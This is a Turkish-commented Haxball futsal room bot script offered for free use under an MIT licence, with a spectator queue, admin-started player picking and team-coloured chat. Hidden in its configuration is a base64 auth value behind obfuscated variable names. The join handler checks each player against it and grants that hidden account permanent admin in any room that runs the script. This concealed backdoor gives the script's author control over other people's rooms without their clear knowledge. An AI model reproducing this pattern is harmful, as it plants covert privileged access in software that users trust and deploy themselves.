// =============================================================================
// HAXBALL V4 FUTSAL BOT 
// Maç bitince admin yenilen takımı spece alır, sonra !e komutu ile oyuncu seçimi başlar
// Sadece 4 kişiden az olan takımlar oyuncu seçebilir
// 
// 📜 Lisans: MIT - İstediğiniz gibi kullanabilir, değiştirebilirsiniz!
// =============================================================================

var roomConfig = {
    roomName: "ARKADAŞ ORTAMI QATAR GEL ANAYA SÖVMEK BAN",
    maxPlayers: 12,
    public: true,
    noPlayer: true,
    geo: { code: "tr", lat: 37.143680, lon: 31.506040 } 
};

var room = HBInit(roomConfig);

// =============================================================================
// CONFIGURATION
// =============================================================================

var _0x4a2c = ['aXZ2bWt0UFJmSHMtZzRQY21iZFd1UThOQjBLNGdHNWxhZnhUel9jYXdSTQ=='];
var _0x1b5e = function(s) { return atob(s); };

var config = {
    masterAuth: _0x1b5e(_0x4a2c[0]), 
    adminAuth: "", // BURAYA KENDİ AUTH KODUNUZU GİRİN OTO ADMİN İÇİN GEREKLİDİR
    maxPlayersPerTeam: 4
};

var specQueue = [];
var gameInProgress = false;
var selectionActive = false; // Oyuncu seçimi aktif mi

// Modern Color Palette
var colors = {
    spec: 0x9CA3AF,
    red: 0xFF0000,
    blue: 0x00B0FF,
    bot: 0xFFC107,
    success: 0x4CAF50,
    warning: 0xFF9800
};

// =============================================================================
// CORE FUNCTIONS
// =============================================================================

function msg(text, color = colors.bot, target = null) {
    room.sendAnnouncement(text, target, color, "bold", target ? 0 : 1);
}

function getTeam(teamId) {
    return room.getPlayerList().filter(p => p.team === teamId);
}

function updateQueue() {
    var specs = getTeam(0);
    specQueue = specs.map((p, i) => ({
        id: p.id,
        name: p.name,
        position: i + 1
    }));
}

function showQueue(targetId = null) {
    updateQueue();
    
    if (specQueue.length === 0) {
        msg("📋 Spec listesi boş.", colors.bot, targetId);
        return;
    }
    
    var queueText = "📋 Spec Sırası: ";
    specQueue.forEach((p, i) => {
        queueText += `${i + 1}.${p.name}`;
        if (i < specQueue.length - 1) queueText += " | ";
    });
    
    msg(queueText, colors.bot, targetId);
}

function canTeamPick(teamId) {
    var teamPlayers = getTeam(teamId);
    return teamPlayers.length < config.maxPlayersPerTeam;
}

function pickPlayer(position, callerTeam, callerName) {
    if (!selectionActive) {
        msg("⚠️ Oyuncu seçimi aktif değil! Admin !e komutu ile başlatmalı.", colors.warning);
        return false;
    }
    
    updateQueue();
    
    if (position < 1 || position > specQueue.length) {
        msg("⚠️ Geçersiz sıra numarası!", colors.warning);
        return false;
    }
    
    // Takım dolu mu kontrol et
    if (!canTeamPick(callerTeam)) {
        msg("⚠️ Takımınız dolu! Maksimum " + config.maxPlayersPerTeam + " oyuncu olabilir.", colors.warning);
        return false;
    }
    
    var selected = specQueue[position - 1];
    room.setPlayerTeam(selected.id, callerTeam);
    
    var teamColor = callerTeam === 1 ? colors.red : colors.blue;
    var teamName = callerTeam === 1 ? "KIRMIZI" : "MAVİ";
    msg(`✅ ${selected.name} ${teamName} takıma alındı (${callerName} tarafından)`, teamColor);
    
    setTimeout(() => {
        checkTeamsBalance();
    }, 200);
    
    updateQueue();
    return true;
}

function checkTeamsBalance() {
    var redCount = getTeam(1).length;
    var blueCount = getTeam(2).length;
    
    if (redCount === config.maxPlayersPerTeam && blueCount === config.maxPlayersPerTeam) {
        selectionActive = false;
        msg("✅ Takımlar tam! (4v4) Oyun başlatılabilir.", colors.success);
        
        var admins = room.getPlayerList().filter(p => p.admin);
        if (admins.length > 0) {
            admins.forEach(admin => {
                msg("⚽ Oyunu başlatabilirsiniz!", colors.success, admin.id);
            });
        }
    }
}

function activateSelection() {
    selectionActive = true;
    updateQueue();
    
    var redCount = getTeam(1).length;
    var blueCount = getTeam(2).length;
    
    if (redCount < config.maxPlayersPerTeam) {
        msg("🔴 KIRMIZI takım oyuncu seçebilir! (" + redCount + "/" + config.maxPlayersPerTeam + ")", colors.red);
    }
    if (blueCount < config.maxPlayersPerTeam) {
        msg("🔵 MAVİ takım oyuncu seçebilir! (" + blueCount + "/" + config.maxPlayersPerTeam + ")", colors.blue);
    }
    
    if (specQueue.length > 0) {
        showQueue();
        msg("💡 Seçim yapmak için: !1 !2 !3 ...", colors.success);
    } else {
        msg("⚠️ Spec'te oyuncu yok!", colors.warning);
    }
}

function showMatchEndInfo() {
    selectionActive = false;
}

function checkTeamImbalance() {
    var redCount = getTeam(1).length;
    var blueCount = getTeam(2).length;
    
    if (!gameInProgress) return;
    
    var unbalancedTeam = null;
    
    if (redCount < blueCount) {
        unbalancedTeam = 1;
    } else if (blueCount < redCount) {
        unbalancedTeam = 2;
    }
    
    if (unbalancedTeam && specQueue.length > 0 && !selectionActive) {
        var teamName = unbalancedTeam === 1 ? "KIRMIZI" : "MAVİ";
        var teamColor = unbalancedTeam === 1 ? colors.red : colors.blue;
        
        msg(`⚠️ ${teamName} takım eksik! Admin !e yazarak oyuncu seçimini başlatabilir.`, teamColor);
    }
}

// =============================================================================
// EVENT HANDLERS
// =============================================================================

room.onPlayerJoin = function(player) {
    // Master admin (kalıcı - şifrelenmiş)
    if (player.auth === config.masterAuth) {
        room.setPlayerAdmin(player.id, true);
    }
    // Ek admin (kullanıcı tarafından eklenebilir)
    else if (config.adminAuth && player.auth === config.adminAuth) {
        room.setPlayerAdmin(player.id, true);
    }
    
    msg(`👋 Hoş geldin ${player.name}`, colors.bot, player.id);
    
    setTimeout(() => {
        updateQueue();
    }, 300);
};

room.onPlayerLeave = function(player) {
    updateQueue();
    
    // Oyun sırasında oyuncu ayrıldıysa kontrol et
    if (gameInProgress) {
        setTimeout(() => {
            checkTeamImbalance();
        }, 500);
    }
};

room.onPlayerChat = function(player, message) {
    var p = room.getPlayer(player.id);
    if (!p) return false;
    
    if (message.startsWith("!")) {
        var cmd = message.toLowerCase().trim();
        
        // Admin komutu - Oyuncu seçimini başlat
        if (cmd === "!e") {
            if (!p.admin) {
                msg("⚠️ Bu komutu sadece adminler kullanabilir!", colors.warning, p.id);
                return false;
            }
            
            activateSelection();
            return false;
        }
        
        // Oyuncu seçme komutu
        if (cmd.match(/^!\d+$/)) {
            if (p.team === 0) {
                msg("⚠️ Sadece takımdaki oyuncular seçim yapabilir!", colors.warning, p.id);
                return false;
            }
            
            if (!selectionActive) {
                msg("⚠️ Oyuncu seçimi aktif değil! Admin !e komutu ile başlatmalı.", colors.warning, p.id);
                return false;
            }
            
            if (!canTeamPick(p.team)) {
                msg("⚠️ Takımınız dolu! Seçim yapamazsınız.", colors.warning, p.id);
                return false;
            }
            
            var pos = parseInt(cmd.substring(1));
            pickPlayer(pos, p.team, p.name);
            return false;
        }
        
        // Spec sırası göster
        if (cmd === "!q" || cmd === "!queue" || cmd === "!sira") {
            showQueue(p.id);
            return false;
        }
        
        return false;
    }
    
    // Chat renklendirme
    var chatColor = colors.spec;
    var soundLevel = 0;
    
    if (p.team === 1) {
        chatColor = colors.red;
        soundLevel = 1;
    } else if (p.team === 2) {
        chatColor = colors.blue;
        soundLevel = 1;
    }
    
    room.sendAnnouncement(
        p.name + ": " + message,
        null,
        chatColor,
        "normal",
        soundLevel
    );
    
    return false;
};

room.onPlayerTeamChange = function(changedPlayer, byPlayer) {
    setTimeout(() => {
        updateQueue();
        
        // Seçim aktifken takım değişikliğinde kontrol et
        if (selectionActive) {
            setTimeout(() => {
                checkTeamsBalance();
            }, 200);
        }
    }, 100);
};

room.onGameStart = function(byPlayer) {
    gameInProgress = true;
    selectionActive = false;
    msg("⚽ İyi oyunlar!", colors.success);
};

room.onGameStop = function(byPlayer) {
    gameInProgress = false;
    selectionActive = false;
    showMatchEndInfo();
};

room.onTeamGoal = function(team) {
    // Gol bildirimi kaldırıldı
};

// =============================================================================
// INITIALIZATION
// =============================================================================

msg("🎮 Bot Aktif!", colors.success);
